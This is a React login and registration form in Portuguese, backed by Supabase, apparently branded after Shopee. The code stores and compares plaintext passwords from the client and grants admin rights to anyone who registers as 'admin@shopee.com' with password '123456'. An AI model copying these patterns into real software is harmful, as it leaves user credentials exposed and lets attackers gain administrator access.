import React, { useState } from "react";
import { X } from "lucide-react";
import { z } from "zod";
import { supabase } from "@/lib/supabaseClient";

const emailSchema = z.string().email({
  message: "Por favor, insira um email válido",
});

const passwordSchema = z.string().min(5, {
  message: "A senha deve ter pelo menos 5 dígitos",
});

interface NewLoginFormProps {
  onAuthComplete?: (userData: { email: string; password: string }) => void;
}

const NewLoginForm = ({ onAuthComplete = () => {} }: NewLoginFormProps) => {
  const [isLogin, setIsLogin] = useState(true);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [confirmPasswordError, setConfirmPasswordError] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const validateEmail = (email: string) => {
    try {
      emailSchema.parse(email);
      setEmailError("");
      return true;
    } catch (error) {
      if (error instanceof z.ZodError) {
        setEmailError(error.errors[0].message);
      }
      return false;
    }
  };

  const validatePassword = (password: string) => {
    try {
      passwordSchema.parse(password);
      setPasswordError("");
      return true;
    } catch (error) {
      if (error instanceof z.ZodError) {
        setPasswordError(error.errors[0].message);
      }
      return false;
    }
  };

  const validateConfirmPassword = (
    password: string,
    confirmPassword: string,
  ) => {
    if (password !== confirmPassword) {
      setConfirmPasswordError("As senhas não coincidem");
      return false;
    }
    setConfirmPasswordError("");
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const isEmailValid = validateEmail(email);
    const isPasswordValid = validatePassword(password);

    if (!isEmailValid || !isPasswordValid) {
      return;
    }

    if (!isLogin) {
      const isConfirmPasswordValid = validateConfirmPassword(
        password,
        confirmPassword,
      );
      if (!isConfirmPasswordValid) {
        return;
      }
    }

    setIsLoading(true);

    try {
      if (isLogin) {
        // Login flow
        const { data, error } = await supabase
          .from("users")
          .select("*")
          .eq("email", email)
          .eq("password", password);

        if (error || !data || data.length === 0) {
          setPasswordError("Email ou senha incorretos");
          setIsLoading(false);
          return;
        }

        // Login successful
        onAuthComplete({ email, password });
      } else {
        // Registration flow
        // Check if email exists
        const { data: existingUsers } = await supabase
          .from("users")
          .select("email")
          .eq("email", email);

        if (existingUsers && existingUsers.length > 0) {
          setEmailError("Este email já está cadastrado");
          setIsLoading(false);
          return;
        }

        // Verify if email exists (this is a simplified check - in production you would use email verification)
        const emailParts = email.split("@");
        if (emailParts.length !== 2 || !emailParts[1].includes(".")) {
          setEmailError("Por favor, insira um email válido");
          setIsLoading(false);
          return;
        }

        // Create new user
        const { error } = await supabase.from("users").insert([
          {
            email: email,
            phone_number: email, // For backward compatibility
            password: password,
            is_admin: email === "admin@shopee.com" && password === "123456",
            full_name: "",
            id_number: "",
          },
        ]);

        if (error) {
          setEmailError("Erro ao criar usuário");
          setIsLoading(false);
          return;
        }

        // Registration successful
        sessionStorage.setItem("isNewLogin", "true");
        onAuthComplete({ email, password });
      }
    } catch (error) {
      console.error("Erro:", error);
      setPasswordError("Ocorreu um erro. Tente novamente.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black/50 z-50">
      <div className="relative w-full max-w-md bg-orange-500/35 p-6 rounded-lg shadow-lg">
        <button
          className="absolute top-2 right-2 text-black hover:text-gray-700"
          onClick={() => window.history.back()}
        >
          <X size={24} />
        </button>

        <h2 className="text-2xl font-bold text-center text-black mb-6">
          Conecte-se
        </h2>

        <div className="flex mb-6">
          <button
            className={`flex-1 py-2 px-4 rounded-l-full ${isLogin ? "bg-orange-500 text-white font-bold border border-black" : "bg-white text-orange-500 font-bold border border-black"}`}
            onClick={() => setIsLogin(true)}
          >
            Conecte-se
          </button>
          <button
            className={`flex-1 py-2 px-4 rounded-r-full ${!isLogin ? "bg-orange-500 text-white font-bold border border-black" : "bg-white text-orange-500 font-bold border border-black"}`}
            onClick={() => setIsLogin(false)}
          >
            Registrar
          </button>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-black font-bold mb-1 uppercase text-sm">
              {isLogin ? "E-MAIL" : "Gmail para cadastro"}
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full p-3 bg-black/90 text-white rounded border border-gray-700 focus:border-orange-500 focus:ring-1 focus:ring-orange-500"
              placeholder="exemplo@email.com"
            />
            {emailError && (
              <p className="text-red-500 text-sm mt-1">{emailError}</p>
            )}
          </div>

          <div>
            <label className="block text-black font-bold mb-1 uppercase text-sm">
              Senha
            </label>
            <div className="relative">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full p-3 bg-black/90 text-white rounded border border-gray-700 focus:border-orange-500 focus:ring-1 focus:ring-orange-500"
                placeholder="Digite a senha"
              />
            </div>
            {passwordError && (
              <p className="text-red-500 text-sm mt-1">{passwordError}</p>
            )}
          </div>

          {!isLogin && (
            <div>
              <label className="block text-black font-bold mb-1 uppercase text-sm">
                Confirme sua senha
              </label>
              <input
                type="password"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                className="w-full p-3 bg-black/90 text-white rounded border border-gray-700 focus:border-orange-500 focus:ring-1 focus:ring-orange-500"
                placeholder="Confirme a senha"
              />
              {confirmPasswordError && (
                <p className="text-red-500 text-sm mt-1">
                  {confirmPasswordError}
                </p>
              )}
            </div>
          )}

          {isLogin && (
            <div className="text-right">
              <a href="#" className="text-black hover:underline text-sm">
                Esqueceu sua senha?
              </a>
            </div>
          )}

          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3 bg-orange-500 text-white font-bold rounded hover:bg-orange-600 transition-colors"
          >
            {isLoading
              ? "Processando..."
              : isLogin
                ? "Conecte-se"
                : "Registrar"}
          </button>
        </form>

        {isLogin && (
          <div className="mt-4 text-center">
            <p className="text-black font-bold">OU CONTINUAR COM</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default NewLoginForm;
